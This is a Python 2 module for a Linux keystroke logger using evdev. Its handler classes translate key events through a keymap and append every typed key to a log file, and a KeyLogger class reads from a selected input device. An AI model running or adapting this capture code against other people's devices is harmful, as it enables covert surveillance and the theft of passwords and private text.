#!/usr/bin/env python
# -*- coding: utf-8 -*-
r"""Name: __init__.py


"""
import evdev
from event import NoEventDevice, AutoKBDInputDevice

import predicate
from keymap import KEYMAPS
from abstract.abcs import SelectABC
from event.dispatcher import (_KeyHoldHandlerABC, _KeyUpHandlerABC,
                             _KeyDownHandlerABC, EventKeyHandler, EventHandler,
                             SelectInputDeviceABC)


__version__ = "0.1.0"

__all__ = [ '' ]


class _KeyLoggerHandleAbstract(object):
    r"""
    """

    def __init__(self, fileobj):
        r"""

        @Arguments:
        - `fileobj`:
        """
        self._fileobj = fileobj

    def write(self, str_):
        r"""SUMMARY

        write(str_)

        @Arguments:
        - `str_`:

        @Return:
        """
        try:
            self._fileobj.write(str_)
            self._fileobj.flush()
        except IOError, err:
            print("Fatal Error: can't write file.")
            print(err)


class KeyUpHandler(_KeyLoggerHandleAbstract, _KeyUpHandlerABC):
    r"""
    """

    def handle(self, event):
        r"""SUMMARY

        handle(event)

        @Arguments:
        - `event`:

        @Return:
        """
        event.unhold()
        if event.scancode in event.shiftkeys:
            return
        if event.scancode in event.modkeys:
            self.write(KEYMAPS.getupkey(event.scancode))


class KeyDownHandler(_KeyLoggerHandleAbstract, _KeyDownHandlerABC):
    r"""
    """

    def handle(self, event):
        r"""SUMMARY

        handle(event)

        @Arguments:
        - `event`:

        @Return:
        """
        if event.scancode in event.modkeys:
            event.hold()
        if event.scancode in event.shiftkeys:
            return
        if event.is_shift_hold():
            self.write(KEYMAPS.getshiftkey(event.scancode))
        else:
            self.write(KEYMAPS.getkey(event.scancode))


class KeyHoldHandler(_KeyLoggerHandleAbstract, _KeyHoldHandlerABC):
    r"""
    """

    def handle(self, event):
        r"""SUMMARY

        handle(event)

        @Arguments:
        - `event`:

        @Return:
        """
        event.hold()

class SettingFile(object):
    r"""
    """

    def __init__(self, outputf):
        r"""

        @Arguments:
        - `outputf`:
        """
        self._outputf = outputf
        if predicate.isstring(outputf):
            try:
                self.fileobj = open(outputf, 'a')
            except IOError:
                # TODO: (Atami) [2013/12/23]
                self.fileobj = None
        # check file object
        elif hasattr(outputf, 'fileno'):
            self.fileobj = outputf
        else:
            raise StandardError()

class KeyLogger(SelectInputDeviceABC, SettingFile):
    r"""
    """
    _keyhandlers = [KeyUpHandler, KeyDownHandler, KeyHoldHandler]
    _keyhandler_map = {}

    def __init__(self, outputf, device=None):
        r"""

        @Arguments:
        - `outputf`:
        - `device`:
        """
        SelectInputDeviceABC.__init__(self, device=device)
        SettingFile.__init__(self, outputf)
        self.handler = self._init_handler()

    def _init_handler(self, ):
        r"""SUMMARY

        _init_handler()

        @Return:
        """
        for klass in self._keyhandlers:
            inst = klass(self.fileobj)
            self._keyhandler_map.update({inst.KEYVALUE: inst.handle})
        eventkeyhandler = EventKeyHandler(dic=self._keyhandler_map)
        handler = EventHandler(dic={
            eventkeyhandler.keyword: eventkeyhandler.do})
        return handler

    def run(self, ):
        r"""SUMMARY

        run()

        @Return:
        """
        try:
            self.handle_io()
        except KeyboardInterrupt:
            print('\n\nKeylogger Keyboard interrupted.')

    def handle_read(self, obj):
        r"""SUMMARY

        handle_read(obj)

        @Arguments:
        - `obj`:

        @Return:
        """
        for event in obj.read():
            self.handler.do(key=event.type, event=event)

    def handle_write(self, obj):
        r"""SUMMARY

        handle_write(obj)

        @Arguments:
        - `obj`:

        @Return:
        """
        pass

    def handle_except(self, obj):
        r"""SUMMARY

        handle_except(obj)

        @Arguments:
        - `obj`:

        @Return:
        """
        pass


# For Emacs
# Local Variables:
# coding: utf-8
# End:
# __init__.py ends here
